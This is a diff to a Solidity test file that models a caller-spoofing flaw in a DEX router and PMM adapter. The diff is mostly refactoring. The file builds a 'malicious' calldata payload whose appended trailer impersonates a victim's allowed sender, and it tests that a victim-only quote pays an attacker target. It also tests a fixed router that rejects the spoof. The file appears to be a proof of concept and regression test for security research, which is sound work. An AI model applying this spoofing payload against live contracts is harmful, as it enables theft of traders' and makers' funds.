@@ -10,7 +10,9 @@ contract MockToken {
     mapping(address => bool) public mover;
     address public immutable owner;
 
-    constructor() { owner = msg.sender; }
+    constructor() {
+        owner = msg.sender;
+    }
 
     function setMover(address who, bool allowed) external {
         require(msg.sender == owner, "OWNER");
@@ -65,7 +67,8 @@ contract PMMAdapterModel {
     function sellBase(address to, address, bytes memory moreInfo) external {
         require(msg.sender == trustedRouter, "UNTRUSTED_ROUTER");
 
-        // Mirrors PMMAdapter._PMMSwap: trailing bytes are not part of the decoded tuple.
+        // Production-equivalent primitive: the canonical tuple is decoded while an
+        // unrelated 32-byte suffix remains outside the authenticated payload.
         (bytes memory orderInfo, bytes memory makerSignature, uint256 signatureType, uint256 orderType) =
             abi.decode(moreInfo, (bytes, bytes, uint256, uint256));
         require(signatureType == 0 && orderType == 4, "MODE");
@@ -79,16 +82,16 @@ contract PMMAdapterModel {
         lastExtractedCaller = extracted;
         lastTarget = to;
 
-        // Economic settlement: attacker funds the taker leg; maker asset goes to attacker target.
-        order.takerToken.move(msg.sender, order.maker, order.takerAmount);
+        // The router has already transferred the attacker-funded taker leg to the adapter.
+        order.takerToken.move(address(this), order.maker, order.takerAmount);
         order.makerToken.move(order.maker, to, order.makerAmount);
     }
 
-    function _extractDexRouterCaller() internal pure returns (address caller) {
+    function _extractDexRouterCaller() internal pure returns (address extractedCaller) {
         assembly ("memory-safe") {
             let candidate := calldataload(sub(calldatasize(), 64))
             if eq(and(candidate, MARKER_MASK), DEX_ROUTER_CALLER_MARKER) {
-                caller := and(candidate, ADDRESS_MASK)
+                extractedCaller := and(candidate, ADDRESS_MASK)
             }
         }
     }
@@ -106,7 +109,7 @@ contract VulnerableRouterModel {
         MockToken takerToken,
         uint256 takerAmount
     ) external {
-        // Model router-controlled input funding. In production the approved router claims from msg.sender.
+        // Production-equivalent funding primitive: the public router takes input from its caller.
         takerToken.move(msg.sender, adapter, takerAmount);
         (bool ok, bytes memory ret) = adapter.call(
             abi.encodePacked(
@@ -114,7 +117,11 @@ contract VulnerableRouterModel {
                 ORIGIN_PAYER | uint256(uint160(refundTo))
             )
         );
-        if (!ok) assembly ("memory-safe") { revert(add(ret, 0x20), mload(ret)) }
+        if (!ok) {
+            assembly ("memory-safe") {
+                revert(add(ret, 0x20), mload(ret))
+            }
+        }
     }
 }
 
@@ -140,7 +147,11 @@ contract FixedRouterModel {
                 ORIGIN_PAYER | uint256(uint160(refundTo))
             )
         );
-        if (!ok) assembly ("memory-safe") { revert(add(ret, 0x20), mload(ret)) }
+        if (!ok) {
+            assembly ("memory-safe") {
+                revert(add(ret, 0x20), mload(ret))
+            }
+        }
     }
 }
 
@@ -161,143 +172,134 @@ contract OkxCallerTrailerTest {
     uint256 internal constant MAKER_AMOUNT = 100 ether;
     uint256 internal constant TAKER_AMOUNT = 200 ether;
 
-    function _fixture(address router)
-        private
-        returns (
-            MockToken makerToken,
-            MockToken takerToken,
-            PMMAdapterModel adapter,
-            PMMAdapterModel.Order memory order,
-            bytes memory signature,
-            bytes memory canonical,
-            bytes memory malicious
-        )
-    {
-        makerToken = new MockToken();
-        takerToken = new MockToken();
-        order = PMMAdapterModel.Order({
+    struct Env {
+        MockToken makerToken;
+        MockToken takerToken;
+        PMMAdapterModel adapter;
+        bytes canonical;
+        bytes malicious;
+    }
+
+    function _fixture(address router) private returns (Env memory env) {
+        env.makerToken = new MockToken();
+        env.takerToken = new MockToken();
+        PMMAdapterModel.Order memory order = PMMAdapterModel.Order({
             maker: MAKER,
             allowedSender: VICTIM_ALLOWED_SENDER,
-            makerToken: makerToken,
-            takerToken: takerToken,
+            makerToken: env.makerToken,
+            takerToken: env.takerToken,
             makerAmount: MAKER_AMOUNT,
             takerAmount: TAKER_AMOUNT,
             salt: keccak256("victim-only-quote")
         });
         bytes memory orderInfo = abi.encode(order);
-        signature = hex"0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20";
-        adapter = new PMMAdapterModel(router, keccak256(orderInfo), keccak256(signature));
-        makerToken.setMover(address(adapter), true);
-        takerToken.setMover(router, true);
-        takerToken.setMover(address(adapter), true);
-        makerToken.mint(MAKER, MAKER_AMOUNT);
-        takerToken.mint(address(this), TAKER_AMOUNT * 4);
-        canonical = abi.encode(orderInfo, signature, uint256(0), uint256(4));
-        malicious = abi.encodePacked(
-            canonical,
+        bytes memory signature = hex"0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20";
+        env.adapter = new PMMAdapterModel(router, keccak256(orderInfo), keccak256(signature));
+        env.makerToken.setMover(address(env.adapter), true);
+        env.takerToken.setMover(router, true);
+        env.takerToken.setMover(address(env.adapter), true);
+        env.makerToken.mint(MAKER, MAKER_AMOUNT);
+        env.takerToken.mint(address(this), TAKER_AMOUNT * 4);
+        env.canonical = abi.encode(orderInfo, signature, uint256(0), uint256(4));
+        env.malicious = abi.encodePacked(
+            env.canonical,
             DEX_ROUTER_CALLER_MARKER | uint256(uint160(VICTIM_ALLOWED_SENDER))
         );
     }
 
     function test_EndToEndVictimOnlyQuoteExecutesForAttackerAndPaysAttackerTarget() public {
         VulnerableRouterModel router = new VulnerableRouterModel();
-        (
-            MockToken makerToken,
-            MockToken takerToken,
-            PMMAdapterModel adapter,
-            PMMAdapterModel.Order memory unusedOrder,
-            bytes memory unusedSignature,
-            bytes memory unusedCanonical,
-            bytes memory malicious
-        ) = _fixture(address(router));
+        Env memory env = _fixture(address(router));
 
-        uint256 makerBefore = makerToken.balanceOf(MAKER);
-        uint256 attackerBefore = makerToken.balanceOf(ATTACKER_TARGET);
-        uint256 takerBefore = takerToken.balanceOf(address(this));
+        uint256 makerBefore = env.makerToken.balanceOf(MAKER);
+        uint256 attackerBefore = env.makerToken.balanceOf(ATTACKER_TARGET);
+        uint256 takerBefore = env.takerToken.balanceOf(address(this));
 
-        router.execute(address(adapter), ATTACKER_TARGET, malicious, REFUND_TO, takerToken, TAKER_AMOUNT);
+        router.execute(
+            address(env.adapter), ATTACKER_TARGET, env.malicious, REFUND_TO, env.takerToken, TAKER_AMOUNT
+        );
 
-        require(adapter.lastExtractedCaller() == VICTIM_ALLOWED_SENDER, "CALLER_NOT_SPOOFED");
-        require(adapter.lastTarget() == ATTACKER_TARGET, "TARGET_NOT_ATTACKER");
-        require(makerToken.balanceOf(MAKER) == makerBefore - MAKER_AMOUNT, "MAKER_ASSET_NOT_DEBITED");
-        require(makerToken.balanceOf(ATTACKER_TARGET) == attackerBefore + MAKER_AMOUNT, "ATTACKER_NOT_CREDITED");
-        require(takerToken.balanceOf(address(this)) == takerBefore - TAKER_AMOUNT, "ATTACKER_NOT_CHARGED");
-        require(takerToken.balanceOf(MAKER) == TAKER_AMOUNT, "MAKER_NOT_PAID");
+        require(env.adapter.lastExtractedCaller() == VICTIM_ALLOWED_SENDER, "CALLER_NOT_SPOOFED");
+        require(env.adapter.lastTarget() == ATTACKER_TARGET, "TARGET_NOT_ATTACKER");
+        require(env.makerToken.balanceOf(MAKER) == makerBefore - MAKER_AMOUNT, "MAKER_ASSET_NOT_DEBITED");
+        require(
+            env.makerToken.balanceOf(ATTACKER_TARGET) == attackerBefore + MAKER_AMOUNT,
+            "ATTACKER_NOT_CREDITED"
+        );
+        require(env.takerToken.balanceOf(address(this)) == takerBefore - TAKER_AMOUNT, "ATTACKER_NOT_CHARGED");
+        require(env.takerToken.balanceOf(MAKER) == TAKER_AMOUNT, "MAKER_NOT_PAID");
     }
 
     function test_NoTrailerFailsClosedAndMovesNoFunds() public {
         VulnerableRouterModel router = new VulnerableRouterModel();
-        (
-            MockToken makerToken,
-            MockToken takerToken,
-            PMMAdapterModel adapter,
-            PMMAdapterModel.Order memory unusedOrder,
-            bytes memory unusedSignature,
-            bytes memory canonical,
-            bytes memory unusedMalicious
-        ) = _fixture(address(router));
-        uint256 makerBefore = makerToken.balanceOf(MAKER);
-        uint256 attackerTakerBefore = takerToken.balanceOf(address(this));
+        Env memory env = _fixture(address(router));
+        uint256 makerBefore = env.makerToken.balanceOf(MAKER);
+        uint256 takerBefore = env.takerToken.balanceOf(address(this));
+
         (bool ok,) = address(router).call(
             abi.encodeWithSelector(
                 router.execute.selector,
-                address(adapter), ATTACKER_TARGET, canonical, REFUND_TO, takerToken, TAKER_AMOUNT
+                address(env.adapter),
+                ATTACKER_TARGET,
+                env.canonical,
+                REFUND_TO,
+                env.takerToken,
+                TAKER_AMOUNT
             )
         );
+
         require(!ok, "NO_TRAILER_ACCEPTED");
-        require(makerToken.balanceOf(MAKER) == makerBefore, "MAKER_FUNDS_MOVED");
-        require(makerToken.balanceOf(ATTACKER_TARGET) == 0, "ATTACKER_CREDITED");
-        require(takerToken.balanceOf(address(this)) == attackerTakerBefore, "TAKER_CHARGED");
+        require(env.makerToken.balanceOf(MAKER) == makerBefore, "MAKER_FUNDS_MOVED");
+        require(env.makerToken.balanceOf(ATTACKER_TARGET) == 0, "ATTACKER_CREDITED");
+        require(env.takerToken.balanceOf(address(this)) == takerBefore, "TAKER_CHARGED");
     }
 
     function test_WrongMarkerFailsClosed() public {
         VulnerableRouterModel router = new VulnerableRouterModel();
-        (
-            MockToken makerToken,
-            MockToken takerToken,
-            PMMAdapterModel adapter,
-            PMMAdapterModel.Order memory unusedOrder,
-            bytes memory unusedSignature,
-            bytes memory canonical,
-            bytes memory unusedMalicious
-        ) = _fixture(address(router));
+        Env memory env = _fixture(address(router));
         bytes memory wrong = abi.encodePacked(
-            canonical,
+            env.canonical,
             ORIGIN_PAYER | uint256(uint160(VICTIM_ALLOWED_SENDER))
         );
+
         (bool ok,) = address(router).call(
             abi.encodeWithSelector(
                 router.execute.selector,
-                address(adapter), ATTACKER_TARGET, wrong, REFUND_TO, takerToken, TAKER_AMOUNT
+                address(env.adapter),
+                ATTACKER_TARGET,
+                wrong,
+                REFUND_TO,
+                env.takerToken,
+                TAKER_AMOUNT
             )
         );
+
         require(!ok, "WRONG_MARKER_ACCEPTED");
-        require(makerToken.balanceOf(ATTACKER_TARGET) == 0, "ATTACKER_CREDITED");
+        require(env.makerToken.balanceOf(ATTACKER_TARGET) == 0, "ATTACKER_CREDITED");
     }
 
     function test_FixedRouterBindsActualCallerAndRejectsSpoof() public {
         FixedRouterModel router = new FixedRouterModel();
-        (
-            MockToken makerToken,
-            MockToken takerToken,
-            PMMAdapterModel adapter,
-            PMMAdapterModel.Order memory unusedOrder,
-            bytes memory unusedSignature,
-            bytes memory unusedCanonical,
-            bytes memory malicious
-        ) = _fixture(address(router));
-        uint256 makerBefore = makerToken.balanceOf(MAKER);
-        uint256 attackerTakerBefore = takerToken.balanceOf(address(this));
+        Env memory env = _fixture(address(router));
+        uint256 makerBefore = env.makerToken.balanceOf(MAKER);
+        uint256 takerBefore = env.takerToken.balanceOf(address(this));
+
         (bool ok,) = address(router).call(
             abi.encodeWithSelector(
                 router.execute.selector,
-                address(adapter), ATTACKER_TARGET, malicious, REFUND_TO, takerToken, TAKER_AMOUNT
+                address(env.adapter),
+                ATTACKER_TARGET,
+                env.malicious,
+                REFUND_TO,
+                env.takerToken,
+                TAKER_AMOUNT
             )
         );
+
         require(!ok, "FIXED_ROUTER_ACCEPTED_SPOOF");
-        require(makerToken.balanceOf(MAKER) == makerBefore, "FIX_MOVED_MAKER_FUNDS");
-        require(makerToken.balanceOf(ATTACKER_TARGET) == 0, "FIX_CREDITED_ATTACKER");
-        require(takerToken.balanceOf(address(this)) == attackerTakerBefore, "FIX_CHARGED_TAKER");
+        require(env.makerToken.balanceOf(MAKER) == makerBefore, "FIX_MOVED_MAKER_FUNDS");
+        require(env.makerToken.balanceOf(ATTACKER_TARGET) == 0, "FIX_CREDITED_ATTACKER");
+        require(env.takerToken.balanceOf(address(this)) == takerBefore, "FIX_CHARGED_TAKER");
     }
 
     function testFuzz_UserSuffixOccupiesMinus64AndDecodedPayloadIsUnchanged(
@@ -319,20 +321,22 @@ contract OkxCallerTrailerTest {
             abi.encodeWithSelector(IAdapterEntry.sellBase.selector, receiver, address(0), malicious),
             ORIGIN_PAYER | uint256(uint160(refundTo))
         );
+
         uint256 minus64 = _wordAtMinus64(externalCall);
         require((minus64 & MARKER_MASK) == DEX_ROUTER_CALLER_MARKER, "MARKER_MISS");
         require(address(uint160(minus64 & ADDRESS_MASK)) == victim, "VICTIM_MISS");
-        (bytes memory a, bytes memory b, uint256 c, uint256 d) =
+
+        (bytes memory decodedOrder, bytes memory decodedSignature, uint256 signatureType, uint256 orderType) =
             abi.decode(malicious, (bytes, bytes, uint256, uint256));
-        require(keccak256(a) == keccak256(orderInfo), "ORDER_MUTATED");
-        require(keccak256(b) == keccak256(signature), "SIGNATURE_MUTATED");
-        require(c == 0 && d == 4, "MODE_MUTATED");
+        require(keccak256(decodedOrder) == keccak256(orderInfo), "ORDER_MUTATED");
+        require(keccak256(decodedSignature) == keccak256(signature), "SIGNATURE_MUTATED");
+        require(signatureType == 0 && orderType == 4, "MODE_MUTATED");
     }
 
-    function _wordAtMinus64(bytes memory payload) private pure returns (uint256 word) {
+    function _wordAtMinus64(bytes memory payload) private pure returns (uint256 result) {
         require(payload.length >= 64, "SHORT");
         assembly ("memory-safe") {
-            word := mload(add(add(payload, 0x20), sub(mload(payload), 64)))
+            result := mload(add(add(payload, 0x20), sub(mload(payload), 64)))
         }
     }
 }
